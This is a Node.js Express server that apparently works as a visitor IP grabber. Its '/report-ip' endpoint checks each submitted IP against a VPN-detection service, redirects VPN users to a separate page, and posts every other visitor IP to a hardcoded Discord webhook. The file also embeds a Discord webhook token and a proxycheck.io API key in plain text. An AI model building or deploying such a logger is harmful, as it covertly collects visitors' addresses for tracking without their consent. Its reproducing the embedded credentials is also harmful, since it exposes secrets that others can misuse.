const http = require('http')
const path = require('path')
const axios = require('axios')
const fs = require('fs')
const express = require('express')

const app = express()
app.set('trust proxy', 1)
app.use(express.json())

const port = 3000

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367504201730494564/QTePbVuODBLbPnQywGkZmnLddlyUA2Td3IczkTZW7G_LMaSFn_qV_x9p5oXEi4SpBR3E'

// Add VPN check helper function
const isVPN = async (ip) => {
  try {
    const response = await axios.post(`https://proxycheck.io/v2/${ip}?key=cy8fut-53x49v-246765-2w74n3`, null, {
      headers: {
        'X-Key': 'cy8fut-53x49v-246765-2w74n3	', // Get your API key from proxycheck.io
        'Content-Type': 'application/json'
      }
    })
    return response.data.type === 'vpn'
  } catch (error) {
    console.error('Error checking VPN status:', error)
    return false
  }
}

app.post('/report-ip', async (req, res) => {
  try {
    const { ip } = req.body
    const isVpn = await isVPN(ip)
    
    if (isVpn) {
      res.status(301).redirect('/vpn')
      return
    }

    await axios.post(DISCORD_WEBHOOK_URL, {
      content: `Visitor IP: ${ip}`,
    })
    res.status(200).send('IP reported successfully')
  } catch (error) {
    console.error('Error sending IP to Discord:', error)
    res.status(500).send('Failed to report IP')
  }
})

app.get('/vpn', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'vpn.html')
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.status(500).send('Error loading vpn.html')
      return
    }
    res.writeHead(200, { 'Content-Type': 'text/html' })
    res.end(data)
  })
})

app.get('/', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'index.html')
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.status(500).send('Error loading index.html')
      return
    }
    res.writeHead(200, { 'Content-Type': 'text/html' })
    res.end(data)
  })
})

app.listen(port, () => {
  console.log(`Server listening on port http://localhost:${port}`)
})
